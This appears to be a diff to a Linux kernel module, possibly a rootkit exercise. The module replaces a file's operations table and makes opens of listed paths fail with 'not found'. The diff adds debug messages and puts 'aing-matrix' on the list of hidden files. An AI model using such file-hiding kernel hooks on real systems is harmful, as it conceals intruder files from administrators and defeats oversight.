@@ -612,8 +612,11 @@ int bad_open(struct inode * ino, struct file *f) {
     int i;
     int result = 0;
 
+    printk(KERN_ALERT "Bad open called\n");
+
     for (i = 0; i < hidden_file_count; ++i) {
         if (strncmp(path_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
+            printk(KERN_ALERT "Found my hidden file\n");
             return -ENOENT;
         }
     }
@@ -661,6 +664,9 @@ static int __init mod_init(void) {
     if (kern_path("/aing-matrix", 0, &my_file_path)) {
         return -1;
     }
+
+    strcpy(hidden_files[hidden_file_count++], "aing-matrix");
+
     my_file_inode = my_file_path.dentry->d_inode;
     file_ops = *my_file_inode->i_fop;
     backup_file_ops = my_file_inode->i_fop;
